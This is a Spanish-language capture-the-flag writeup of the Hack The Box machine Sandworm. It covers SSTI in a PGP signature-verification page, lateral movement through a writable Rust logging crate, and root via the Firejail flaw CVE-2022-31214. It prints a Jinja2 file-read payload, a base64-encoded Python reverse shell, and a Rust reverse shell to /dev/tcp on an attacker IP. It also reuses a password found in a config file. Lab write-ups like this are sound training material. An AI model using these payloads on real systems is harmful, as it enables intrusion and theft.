---
title: Sandworm - Hack the Box (htb)
author: Nilson Freid Delgado Rodriguez
date: 2023-10-31 22:09:00 +0800
categories: [Writeup, htb]
tags: [htb,ctf,linux, hack the box,SSTI,firejail]
pin: true
math: true
mermaid: true
image:
  path: /writeup-htb-sandworm/sandworm_logo2.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Sandworm
---

> Queridos lectores, es un placer darles la bienvenida a este fascinante viaje a través del mundo de HackTheBox. En esta ocasión, nos sumergiremos en los entresijos de la máquina Sandworm, un reto catalogado como de dificultad media y la cual está alojada en un servidor Linux. En este emocionante recorrido, exploraremos una vulnerabilidad de Server Side Template Injection (SSTI), la cual nos permitiría obtener una user shell, y luego, ganaremos acceso a otro usuario. Como desafío final debemos realizar una escalada de privilegios (privilege escalation) a través de Firejail para obtener el codiciado acceso de root.   

## Reconocimiento
Primeramente iniciamos con el escaneo de puerto mediante la herramienta `nmap`.
```bash
sudo nmap 10.10.11.218 -Pn -p- -n -sS -T4 -oN scan1 -vvv
```
Como resultado se obtiene tres puertos abiertos los cuales son: el 22,80 y 443.
![Desktop View](/writeup-htb-sandworm/nmap1.png)
_Nmap scan_
Para obtener mayor información de estos puertos se utilizará el siguiente comando:
```bash
nmap 10.10.11.218 -Pn -p 22,80,443 -sV -sC -oN scan2
```
Como resultado se observa servicio de ssh en el puerto 22, en el puerto 80 un servicio http, en el cual hay una redirección a https://ssa.htb, por último tenemos el puerto 443 donde hay un servicio de ssl/http, que vendría a ser un sitio web seguro y por deducción corresponde a `https://ssa.htb`.
![Desktop View](/writeup-htb-sandworm/nmap2.png)
_Nmap scan_

## Enumeración
Para poder observar el sitio web https://ssa.htb es necesario agregarlo a nuestro archivo `/etc/hosts`{: .filepath} y para ello se debe de editar el archivo con `nano` y agregar en una nueva línea lo siguiente:
```
10.10.11.218    ssa.htb
```
{: file='/etc/hosts'}
>Primero la ip y luego el dominio.
{: .prompt-info }
Ahora podemos ver el contenido de `https://ssa.htb`, donde nos indica que pertenece a Secret Spy Agency.  
![Desktop View](/writeup-htb-sandworm/spy.png)
_https://ssa.htb_
Realizamos la enumeración de las páginas para este dominio con la herramienta `wfuzz`.  
```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  https://ssa.htb/FUZZ
```
Donde se obtuvo como resultado: admin, guide, pgp, etc.  
![Desktop View](/writeup-htb-sandworm/wfuzz.png)
_Wfuzz_
En `https://ssa.htb/admin` nos redirige a un login, en el cual se intentó diversos métodos para loguearse, sin embargo, no se tuvo éxito, por lo tanto, la vulnerabilidad debe estar en otro lugar.  
![Desktop View](/writeup-htb-sandworm/login.png)
_Login_
En `https://ssa.htb/guide` hay una demostración de la `encriptación PGP`, en el cual hay diferentes cuadros de texto para realizar funciones como desencriptar un mensaje, encriptar mensaje y verificar el signature.
![Desktop View](/writeup-htb-sandworm/guide.png)
_Guide_
Justamente en verificar signature hay 2 cuadros de texto en los cuales podemos ingresar datos, uno es para la public key y el otro para el signed text. Como se puede ingresar los datos sin restricciones lo que vamos a hacer es generar una public key y también un signed text.  
![Desktop View](/writeup-htb-sandworm/guide1.png)
_Guide_
## Explotación
### Uso de GPG para generar PGP keys
En el artículo [**generate pgp keys**](https://linuxhint.com/generate-pgp-keys-gpg) nos indican como se puede generar PGP keys con la herramienta `GPG`.
Con esta información procedemos a generar nuestra pgp key.
```bash
gpg --gen-key
```
> El programa pedirá colocar un `real name` (colocar cualquier nombre), un `email` (colocar cualquier email) y también confirmar dichos datos para lo cual se debe digitar `o`. Por último pedirá digitar una `clave` (colocar una clave que les sea fácil de recordar)
{: .prompt-info }

![Desktop View](/writeup-htb-sandworm/gpg.png)
_GPG_
Finalizado la generación de la key, podemos verificar su existencia con lo siguiente:
```bash
gpg -k
```
Ahora exportamos la public key.  
```bash
gpg -a -o public.key --export atlas
```
> Donde public.key es el nombre como se exportará y atlas es el real name de la key generada anteriormente.
{: .prompt-info }

![Desktop View](/writeup-htb-sandworm/gpg public.png)
_Export public key_
Para crear el signed text lo realizamos de la siguiente forma:
```bash
echo 'mensaje' | gpg --clear-sign
```
> Donde mensaje es un texto al que le quiero realizar sign.
{: .prompt-info }

Esto da como resultado un PGP SIGNED.
![Desktop View](/writeup-htb-sandworm/gpg sign.png)
_Creación de Sign_
Copiamos el public key y el PGP signed y lo pegamos en los cuadros de texto correspondientes de `https://ssa.htb/guide`, luego se ejecuta.
El resultado es un popup en el cual hay información de la verificación del Signature.
> Entre toda esta información hay una cosa muy curiosa y es que el real name de nuestra public key está apareciendo (`atlas`). Esto es un indicativo de que podemos realizar una ataque de inyección.  
{: .prompt-tip }
![Desktop View](/writeup-htb-sandworm/verification.png)
_Verification Signature_
Se probó diferentes ataques de inyección, sin embargo, el que tuvo éxito fue el de `Server Side Template Injection`.  
### Vulnerabilidad Server Side Template Injection
> La inyección de plantillas en el Lado del servidor (Server Side Template Injection o SSTI, por sus siglas en inglés) es una vulnerabilidad de seguridad web que ocurre cuando una aplicación web permite a los usuarios inyectar código en las plantillas del lado del servidor. Las plantillas del lado del servidor son archivos que contienen código para generar la interfaz de usuario de una aplicación web. Cuando un atacante puede inyectar y ejecutar código malicioso en estas plantillas, puede manipular la salida generada por la aplicación.
Los ataques de SSTI son especialmente peligrosos porque permiten a los atacantes ejecutar código en el servidor mismo, lo que puede conducir a una variedad de consecuencias graves, como la exposición de datos sensibles, la ejecución de comandos en el servidor y la escalada de privilegios.
{: .prompt-info }
En el artículo [**SSTI (Server Side Template Injection)**](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) nos dan detalles como detectar este tipo de inyección.  
> Para este caso vamos a utilizar **\{\{7*7\}\}** para comprobar dicha vulnerabilidad.  

Como hemos descubierto el real name es el parámetro que se inyecta, entonces vamos a colocar el valor de \{\{7*7\}\} como el real name.
Bien vamos a generar nuestra key.
```bash
gpg --gen-key
```
![Desktop View](/writeup-htb-sandworm/gpg2.png)
_GPG_
Luego exportamos la publick key de la key generada.
![Desktop View](/writeup-htb-sandworm/gpg public2.png)
_Export public key_
Generamos el signed text.
![Desktop View](/writeup-htb-sandworm/gpg sign2.png)
_Creación de Sign_
> Donde -u se utiliza para especificar el real name al cual le vamos a generar su sign. 
{: .prompt-info }

Copiamos la public key y el PGP signed, luego se ejecutó. Se obtuvo como resultado `49`, lo cual es el resultado de multiplicar 7\*7, por lo tanto, se comprueba que existe la vulnerabilidad de SSTI.
![Desktop View](/writeup-htb-sandworm/verification2.png)
_Verification Signature_
Ahora vamos a determinar el lenguaje que está detrás, y para ello nos apoyamos del siguiente mapa.
![Desktop View](/writeup-htb-sandworm/SSTI.png)
_mapa SSTI_
Como \{\{7\*7\}\} da un resultado exitoso, tenemos que probar \{\{7\*\'7\'\}\} y si se tiene éxito estaremos ante Jinja2 o Twig.
Realizamos los pasos anteriores de generar una nueva key, exporta su public key y generar el PGP signed.
> Utilizamos **\{\{7\*\'7\'\}\}** como el real name.

Una vez verificada el signed, se obtiene como resultado `7777777`, por lo tanto, en el backend se utiliza `Jinja2` o `Twig`.
![Desktop View](/writeup-htb-sandworm/verification3.png)
_Verification Signature_
En el siguiente repositorio de Github [**PayloadsAllTheThings**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---remote-code-execution) encontramos payloads de SSTI para Jinja2.
> Utilizaremos el payload **\{\{ get_flashed_messages.\_\_globals\_\_.\_\_builtins\_\_.open(\"/etc/passwd\").read() \}\}** para leer el archivo `/etc/passwd`{: .filepath}.  

Realizamos los pasos anteriores y obtenemos como resultado el contenido de  `/etc/passwd`{: .filepath}, por lo tanto la inyección ha sido un éxito.
![Desktop View](/writeup-htb-sandworm/verification4.png)
_Verification Signature_
### Obtención de shell
Bien ahora vamos a obtener una shell para ello vamos a utilizar el payload **\{\{self.\_\_init\_\_.\_\_globals\_\_.\_\_builtins\_\_.\_\_import\_\_(\'os\').popen(\'id\').read()\}\}**, pero vamos a cambiar el `id` por `echo "código para generar reverse shell encodeada en base 64" | base64 -d | bash`.

> **Código de reverse shell:**  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.92",3222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'

> **Código encodeado en base 64:** cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjkyIiwzMjIyKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigiYmFzaCIpJw==

Por lo tanto el payload final queda como:
>**\{\{self.\_\_init\_\_.\_\_globals\_\_.\_\_builtins\_\_.\_\_import\_\_('os').popen(\'echo \"cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjkyIiwzMjIyKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigiYmFzaCIpJw== \"\|base64 -d\|bash\').read() }}**

Realizamos la generación de la key, exportación de la public key y el PGP signed. Antes de verificar la signature en nuestra consola colocamos nuestro puerto 3222 en escucha.
```bash
nc -lvnp 3222
```
Verificamos el signature y luego de unos segundos, obtenemos acceso a la shell del usuario `atlas`.
![Desktop View](/writeup-htb-sandworm/user shell.png)
_User shell_
## Obtener flag de usuario
En el directorio del usuario atlas observamos diversos archivos, sin embargo, el archivo user.txt no se encuentra aquí.  
![Desktop View](/writeup-htb-sandworm/atlas.png)
_Directorio de atlas_
En el directorio `/home` vemos la carpeta del usuario `atlas` y del usuario `silentobserver`, por lo tanto el flag del usuario debe estar en la carpeta de ese usuario.  
![Desktop View](/writeup-htb-sandworm/home.png)
_Home_
> Revisando los archivos del usuario atlas, en la ruta `.config/httpie/sessions/localhost_5000` hay algo interesante, un archivo `admin.json`.  
{: .prompt-tip }
![Desktop View](/writeup-htb-sandworm/config.png)
_.config_
En el contenido de este archivo podemos encontrar el `password` del usuario `silentobserver`.  
![Desktop View](/writeup-htb-sandworm/pass silent.png)
_Password del usuario silentobserver_
Por medio de `ssh` nos conectamos al usuario silentobserver.
```bash
ssh silentobserver@10.10.11.218 
```
![Desktop View](/writeup-htb-sandworm/ssh.png)
_SSH_
Al ingresar se observa el archivo `user.txt` que contiene el flag.  
![Desktop View](/writeup-htb-sandworm/flag user.png)
_user flag_

## Escalada de privilegios (Privilege escalation)
Como desafío final debemos de escalar privilegios para obtener el acceso a root.
Realizamos la enumeración del sistema y en los archivos con permisos `setuid` encontramos a `firejail`, el cual tiene una vulnerabilidad que permite escalar privilegios.
> El permiso setuid es un tipo de permiso especial que se puede aplicar a archivos ejecutables, los cuales permiten ejecutar el archivo con los privilegios del propietario en lugar de los privilegios del usuario que lo ejecuta. Esto significa que si un usuario ordinario tiene permisos para ejecutar un archivo con el bit setuid, el programa se ejecutará con los mismos privilegios que el propietario del archivo; es por este motivo que se buscan este tipo de archivos, ya que permiten escalar privilegios.  
{: .prompt-info }
Para enumerar los archivos con permisos con de setuid podemos usar lo siguiente:  
```bash
find / -perm /4000 2>/dev/null
```
![Desktop View](/writeup-htb-sandworm/find.png)
_find setuid_

Al listar los permisos del archivo firejail encontramos que el propietario es `root`, por lo tanto, si podemos escalar por este medio. Su grupo es `jailer` y tiene permiso de ejecución.  
![Desktop View](/writeup-htb-sandworm/ls firejail.png)
_listar permisos del archivo_
Del archivo `/etc/groups`{: .filepath} , obtenemos los usuarios que pertenecen al grupo jailer.   
Donde el usuario `atlas` es integrante de este grupo.
![Desktop View](/writeup-htb-sandworm/group.png)
_grupo_
Entonces para poder ejecutar el archivo firejail debemos de tener una shell del usuario `atlas`. La shell lo podemos obtener con lo visto anteriormente en el apartado de `Obtención de shell` o también se puede lograr por el siguiente método.
### Movimiento de silentobserver a atlas.
Cuando estuve espiando los procesos que se están ejecutando en el sistema, mediante el uso de la herramienta `pspy`; observé que de manera recurrente se estaba ejecutando `/usr/bin/chmod u+s /opt/tipnet/target/debug/tipnet`, por lo tanto, revise el directorio `/opt/tipnet/target/debug/` y el archivo `tipnet` donde encontré cosas muy curiosas, las cuales les estaré hablando más adelante.  
Antes de continuar quisiera explicarles respecto a la herramienta `pspy` y como la podemos usar.
> Pspy es una herramienta de línea de comandos diseñada para espiar procesos sin necesidad de permisos de root. Permite ver los comandos ejecutados por otros usuarios, trabajos cron, etc. Los archivos binarios de esta herramienta los podemos descargar del siguiente repositorio [**pspy**](https://github.com/DominicBreuker/pspy), donde también nos indican como la podemos usar.
{: .prompt-info }
De acuerdo al repositorio, debemos de descargar el archivo binario, luego enviarlo a la máquina víctima, darle permisos de ejecución y finalmente ejecutarlo.
- Para enviar el archivo binario a la máquina víctima, lo podemos hacer de la siguiente manera.
  + Iniciar un servidor web en nuestro máquina.
```bash
python3 -m http.server 80
```
  ![Desktop View](/writeup-htb-sandworm/pspy server.png)
  _Iniciar servidor_
  + Descargar archivo en la máquina víctima.
```bash
wget http://10.10.14.78/pspy64
```
> Donde 10.10.14.78 es la ip de tu máquina.
{: .prompt-info }
  ![Desktop View](/writeup-htb-sandworm/pspy download.png)
  _Descargar archivo_
- Dar permiso de ejecución.
```bash
chmod +x pspy64
```
![Desktop View](/writeup-htb-sandworm/pspy permiso.png)
_Dar permiso de ejecución_
  
- Ejecutar el archivo.
```bash
./pspy64
```
![Desktop View](/writeup-htb-sandworm/pspy.png)
_Ejecutar el archivo_

Pasado un tiempo va a empezar a salir `/usr/bin/chmod u+s /opt/tipnet/target/debug/tipnet` de manera recurrente.   
![Desktop View](/writeup-htb-sandworm/pspy exec.png)
_Procesos_
Listamos los permisos de `/opt/tipnet/target/debug/tipnet`, el propietario es el `usuario atlas` y tiene permisos de `setuid`, por lo tanto la ejecución de este programa se realizará como si fuera el usuario atlas.  
![Desktop View](/writeup-htb-sandworm/ls tipnet.png)
_Listar permisos_
En el directorio de `/opt/tipnet/target/debug/` hay un archivo `tipnet.d`{: .filepath} y al listar el contenido aparecen 3 archivos. El `/opt/tipnet/target/debug/tipnet`, `/opt/crates/logger/src/lib.rs` y `/opt/tipnet/src/main.rs`. Al parecer en este archivo se indica cuáles son las dependecias del archivo `/opt/tipnet/target/debug/tipnet`{: .filepath}.  
Con está información listamos los permisos de `/opt/crates/logger/src/lib.rs` y para nuestra sorpresa tenemos permisos de escritura, por lo tanto, podemos modificar este archivo.  
![Desktop View](/writeup-htb-sandworm/permisos lib.png)
_Listar permisos_
Por el contenido de este archivo nos damos cuenta que es un programa para registrar logs.  
![Desktop View](/writeup-htb-sandworm/cat lib.png)
_Contenido de lib.rs_
Como necesitamos obtener una shell digitamos `reverse shell in rust` en google y en el repositorio [**reverse shell in rust**](https://gist.github.com/GugSaas/512fc84ef1d5aefec4c38c2448935b01) se observa el siguiente código.  
>Las extensiones .rs son de rust.
{: .prompt-info }
```rust
extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;
use std::process::Command;

pub fn log(user: &str, query: &str, justification: &str) {
    let command = "bash -i >& /dev/tcp/10.10.14.67/444 0>&1";
    let output = Command::new("bash")
        .arg("-c")
        .arg(command)
        .output()
        .expect("not work");

    if output.status.success() {
        let stdout = String::from_utf8_lossy(&output.stdout);
        let stderr = String::from_utf8_lossy(&output.stderr);
        println!("standar output: {}", stdout);
        println!("error output: {}", stderr);
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        eprintln!("Error: {}", stderr);
    }
}
```
Reemplazamos la ip `10.10.14.67` por nuestra ip y el puerto `444`, lo cambiamos por el de nuestra preferencia.  
Con `nano` editamos `/opt/crates/logger/src/lib.rs`{: .filepath} y colocamos el código anterior, cambiando `ip` y `puerto`.
![Desktop View](/writeup-htb-sandworm/mod lib.png)
_Modificacion de lib.rs_
Antes de guardar; en otra shell colocamos nuestro puerto en escucha.
```bash
nc -lvnp 3222
```
Guardamos y luego de un tiempo tenemos acceso al usuario `atlas`.   
![Desktop View](/writeup-htb-sandworm/shell atlas.png)
_Puerto en escucha_
### Escalada de privilegios con firejail
Con el acceso al usuario `atlas` ya podemos utilizar `firejail`. Listamos la versión de firejail y es la 0.9.68.
```bash
firejail --version
```
![Desktop View](/writeup-htb-sandworm/firejail version.png)
_Version de firejail_
Se buscó en google vulnerabilidades para esta versión de firejail y se encontró el `CVE-2022-31214`, donde nos indican que la version `0.9.68` es vulnerable, por lo tanto, esta es la vulnerabilidad presente.
> La vulnerabilidad CVE-2022-31214, permite a un usuario sin privilegios falsificar un proceso Firejail legítimo, generando un entorno en el que el espacio de nombres de usuario de Linux sigue siendo el espacio de nombres de usuario inicial, este espacio de nombres de montaje ingresado está bajo el control del atacante y mediante la ejecución de binarios setuid-root disponibles, como su o sudo, se puede obtener acceso de root. Fuente: [**NIST**](https://nvd.nist.gov/vuln/detail/CVE-2022-31214).
{: .prompt-info }
Buscando en google se encontró la prueba de concepto([**PoC**](https://seclists.org/oss-sec/2022/q2/188)) para esta vulnerabilidad, como también más detalle de la vulnerabilidad.
- Descargamos el exploit proporsionado y lo enviamos a la máquina víctima.
  + Para enviar el exploit iniciamos un servidor web en nuestro máquina.
```bash
python3 -m http.server 80
```
  ![Desktop View](/writeup-htb-sandworm/firejoin server.png)
  _Iniciar servidor_
  + Descargamos el archivo en la máquina víctima.
```bash
wget http://10.10.14.78/firejoin_py.bin
```

   > Donde 10.10.14.78 es la ip de tu máquina.   
   {: .prompt-info }
   ![Desktop View](/writeup-htb-sandworm/descarga firejail.png)
   _Descargar archivo_
- Damos permiso de ejecución.
```bash
chmod +x firejoin_py.bin
```
![Desktop View](/writeup-htb-sandworm/permiso firejail.png)
_Permiso de ejecución_
- Antes de ejecutar lo que vamos a hacer es actualizar nuestro shell, ya que si no lo actualizas no interpreta bien el exploit.
```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
```
![Desktop View](/writeup-htb-sandworm/actualizacion shell.png)
_Actualizar shell_
- Ahora sí, ejecutamos el exploit.
```bash
./firejoin_py.bin &
```

> Se coloca & al final para que aparezca el join.   
{: .prompt-info }

![Desktop View](/writeup-htb-sandworm/ejecución firejail.png)
_Ejecutar exploit_
Indica que debemos de colocar `firejail --join=54130` en otra shell, por lo tanto, ingresamos a otra shell del usuario `atlas`. Para lograr esto debemos de nuevamente de modificar el archivo `/opt/crates/logger/src/lib.rs`{: .filepath} y colocar un puerto diferente al ya utilizado.  
Una vez tengamos nuestra nueva shell, vamos a realizar lo siguiente:
- Primeramente actualizamos la shell.  
```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
```
![Desktop View](/writeup-htb-sandworm/actualizacion shell.png)
_Actualizar shell_
- Colocamos ` firejail --join=54130`.    
```bash
firejail --join=54130
```
![Desktop View](/writeup-htb-sandworm/firejail join.png)
_Firejail join_
- Por ultimo colocamos `su -`.  
```bash
su -
```
Listo ahora somos root.  
![Desktop View](/writeup-htb-sandworm/su -.png)
_su_
Listamos los archivos, visualizamos el flag `root.txt`.  
![Desktop View](/writeup-htb-sandworm/root flag.png)
_root flag_

> Espero les haya gustado este post, nos vemos en una siguiente oportunidad.  
`¡Happy Hacking!` `¡You can be root!`
